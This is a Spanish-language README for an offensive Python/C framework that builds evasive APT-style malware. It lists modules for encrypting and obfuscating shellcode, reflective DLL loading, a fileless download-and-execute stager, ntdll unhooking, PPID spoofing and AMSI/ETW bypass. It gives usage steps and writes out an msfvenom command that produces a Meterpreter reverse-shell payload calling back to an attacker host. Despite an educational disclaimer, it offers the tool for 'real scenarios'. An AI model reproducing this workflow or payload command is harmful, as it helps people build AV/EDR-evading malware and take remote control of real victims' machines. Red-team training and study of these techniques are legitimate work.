
# NextGen APT Framework

NextGen es un proyecto ofensivo desarrollado en Python para automatizar la creación de cadenas de ejecución estilo APT (Advanced Persistent Threat). Nació como una respuesta a la necesidad de integrar múltiples técnicas avanzadas aprendidas en laboratorios de HTB Academy, retos de evasión, y el curso **Certified Red Team Operator (CRTO)**, en un solo entorno modular, escalable y realista, uniendo C con Python.

El objetivo es crear una herramienta profesional para construir malware personalizado, evasivo, y técnicamente sólido, que aplique en escenarios reales de red team, simulación de amenazas, y estudios ofensivos controlados.

---

## Motivación
Sinceramente estoy buscando mejorar algunas tecnicas para un futuro obtener el OSCE3
Durante el estudio del CRTO y HTB, surgió la necesidad de:

- Generar loaders que no dependan de AV-detectables como `LoadLibrary`.
- Inyectar shellcode y DLLs desde memoria sin pasar por disco.
- Aplicar cifrado y ofuscación de payloads para evadir análisis estático.
- Implementar técnicas de evasión modernas como PPID spoofing, AMSI bypass y API hashing.
- Compilar, cifrar y automatizar todo desde una interfaz central.

NextGen responde a esa necesidad, con una arquitectura modular dividida en etapas ofensivas.

---

## Explicación Técnica por Módulo

### [1] Cifrado de Shellcode (AES/XOR/AES+XOR)
- Tienes que crear la shell con metasploit, microshell, CS, etc..
- Evita detección estática mediante cifrado.
- Crea `.dat` cifrado con XOR, AES o ambos.
- Se usa en el Stage 1 para ser descifrado dinámicamente.

### [2] Ofuscación de .dat
- Inserta bytes aleatorios para evadir análisis de firmas.
- Genera `.obf.dat` que requiere ser limpiado antes de ejecución.

### [3] Compilar ejecutable (Windows/Linux)
- Usa gcc o mingw para compilar el loader completo con módulos opcionales.
- Permite generar binarios ofuscados con código embebido.

### [4] Generar código Reflective/Manual Mapping
- Genera código `reflective_loader.c` para cargar DLL desde memoria.
- Ideal para payloads que requieren ejecución en memoria sin AV.

### [5] Generar Stager HTTP(S)
- Stager que descarga un `.dat` desde una URL y lo ejecuta desde memoria.
- Permite ejecución completamente fileless.

### [6] Técnicas de evasión avanzadas
- Unhooking de ntdll.dll, API hashing, y resolución dinámica.
- Mejora evasión frente a EDR y AV con hooks.

### [7] Generar PPID Spoofing
- Ejecuta procesos como hijos de explorer.exe u otros para evadir correlación.
- Ideal para escenarios de simulación avanzada.

### [8] Bypass AMSI/ETW + Anti-Debug
- Parcheo en tiempo de ejecución a funciones monitoreadas.
- Finaliza el programa si se detecta debugger activo.

---

## Cómo se Usa

1. Ejecuta:

```bash
python3 nextgen.py
```
## Output

2. Cifra tu payload .bin con [1]
3. Ofúscalo con [2] (opcional)
4. Compílalo con [3]
5. Usa [4] si quieres cargar una DLL desde memoria
6. Usa [5] si deseas que el payload se descargue desde la red
7. Usa [7] para lanzar el loader con un PPID falso
8. Usa [8] si quieres evitar AMSI, ETW y debuggers

![image](https://github.com/user-attachments/assets/b68a29f7-c3f8-44b0-ac12-c86231f76aa6)


## Recomendaciones
Antes de cifrar el payload tienes que crearlo:

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=TUIP LPORT=tupuerto -f raw -o data/shellcode/payload.bin

Añade evasion.c, bypass.c, reflective_loader.c en la compilación:

x86_64-w64-mingw32-gcc core/loader.c templates/evasion.c templates/bypass.c -o loader.exe -O2 -s

Siempre probar en laboratorio controlado (Kali, Win10 VM, Sysmon, Defender, etc.)
Puedes agregar syscalls_gen.py con técnicas estilo SysWhispers

## Referencias Técnicas

https://attack.mitre.org/techniques/T1027/002/ (Encoded payloads)
https://attack.mitre.org/techniques/T1055/012/ (Reflective DLL Injection)
https://attack.mitre.org/techniques/T1055/009/ (Proc Thread Attribute spoofing)
https://attack.mitre.org/techniques/T1562/001/ (Disable or Modify Tools)
https://academy.hackthebox.com/ (todo lo que exista aqui es excelente recurso)
https://github.com/jthuraisamy/SysWhispers
https://github.com/SigmaHQ/sigma/wiki/PPID-Spoofing
https://institute.sektor7.net/rto-maldev-intermediate
https://empyreal96.github.io/nt-info-depot/Windows-Internals-PDFs/Windows%20System%20Internals%207e%20Part%201.pdf
https://maldevacademy.com/

# Licencia

Este proyecto es estrictamente con fines educativos. El uso ofensivo en entornos no autorizados es ilegal y responsabilidad del usuario.

## Falta completar 
- loader.c
- stages
- posibles mejoras en una compilacion o inyeccion por secuencia.
